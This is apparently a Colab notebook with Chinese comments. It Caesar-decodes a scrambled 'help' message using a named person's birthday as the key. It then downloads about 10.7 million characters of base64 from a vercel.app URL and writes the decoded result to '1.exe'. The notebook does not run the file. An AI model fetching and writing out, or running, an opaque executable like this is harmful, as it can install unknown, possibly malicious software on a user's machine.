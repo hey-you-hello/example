{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyPmxKA6R5h0LPADqP2XGdkE",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/hey-you-hello/example/blob/main/%E6%88%91%E7%B5%A6%E4%BD%A0%E7%9A%84%E9%95%B7%E6%96%87.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "9VQO-xVUrW6s"
      },
      "outputs": [],
      "source": [
        "\n",
        "import requests\n",
        "#使用這裡面的東東來解密以獲得幫助！\n",
        "key=int(input('詹晉瑜生日日期?'))\n",
        "這是幫助='''\n",
        "\n",
        "徒妇，恷喦佪戚助逤遘笶上殿努寐！\n",
        "佐昹昹掯丕侐皎觭寐佪致巻上室昹丗叴遝皎\n",
        "扊仯誴上室見咖 屏抃踬 記諠！咖佪皎 屏抃踬 誴\n",
        "寐斑寵圲裫靬皎myno屶怱\n",
        "揚祄昹：連朓叹脇昹堁衖檞桒喞\n",
        "\n",
        "'''\n",
        "code=requests.get(\"https://brawlstar-theta.vercel.app/我有可能是執行檔喔.txt\").text\n",
        "\n",
        "class Caesar:\n",
        "    def __init__(self, shift):\n",
        "        self.shift = shift\n",
        "\n",
        "    def encrypt(self, text):\n",
        "        result = \"\"\n",
        "        for char in text:\n",
        "            if char.isalpha():\n",
        "                base = ord('A') if char.isupper() else ord('a')\n",
        "\n",
        "                shifted = (ord(char) - base + self.shift) + base\n",
        "                result += chr(shifted)\n",
        "            else:\n",
        "                result += char\n",
        "        return result\n",
        "\n",
        "    def decrypt(self, text):\n",
        "\n",
        "        return Caesar(-self.shift).encrypt(text)\n",
        "\n",
        "print(Caesar(key).decrypt(這是幫助))"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import base64\n",
        "print(f'字數:{len(code)}')#查看字數\n",
        "#看到沒 1千萬字\n",
        "with open(\"1.exe\",\"wb\") as f:\n",
        "  f.write(base64.b64decode(code))\n"
      ],
      "metadata": {
        "id": "fWT1vMWxrXiq",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "82a4cf26-080e-42d1-c472-106f7c7c70ef"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "字數:10705784\n"
          ]
        }
      ]
    }
  ]
}